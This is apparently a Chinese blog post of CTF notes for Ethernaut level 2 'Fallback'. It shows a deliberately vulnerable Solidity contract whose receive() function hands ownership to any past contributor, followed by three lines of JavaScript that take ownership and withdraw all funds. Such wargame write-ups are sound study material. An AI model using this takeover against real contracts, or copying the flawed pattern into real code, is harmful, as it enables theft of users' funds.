---
title: Ethernaut 闯关笔记 第2关 Fallback
date: 2023-11-16 11:36:35
tags:
---

待攻击的合约代码：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
```

调用 `contribute()` 可以为合约贡献 ETH ，为合约贡献最多的地址将成为合约的 owner 。 owner 可以提取合约全部的资金（也就是赢者通吃）。

合约创建者初始默认有 1000ETH 的贡献，也就是说其他的地址需要贡献大于 1000ETH 的资金。这是很困难的。

但是 `receive()` 函数也可以改变 owner ，并且其条件更加简单，只需要发送两次资金即可。

攻击代码：

```javascript
await contract.contribute({value: 1})
await contract.sendTransaction({value: 1})
await contract.withdraw()
```